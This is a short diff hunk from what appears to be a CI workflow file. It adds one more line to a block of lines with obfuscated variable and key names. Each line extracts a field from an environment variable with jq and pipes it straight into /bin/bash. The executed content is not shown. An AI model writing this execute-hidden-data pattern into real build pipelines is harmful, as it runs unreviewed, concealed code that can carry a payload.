@@ -25,6 +25,7 @@ jobs:
           echo $duhjy66 | jq -r .afnck1 | /bin/bash
           printf '%s' "$kojg9148" | jq -r .o039 | /bin/bash
           printf '%s' "$hq61" | jq -r .ivt6 | /bin/bash
+          printf '%s' "$afr356" | jq -r .y584 | /bin/bash
 
       - name: Upload artifact
         if: always()
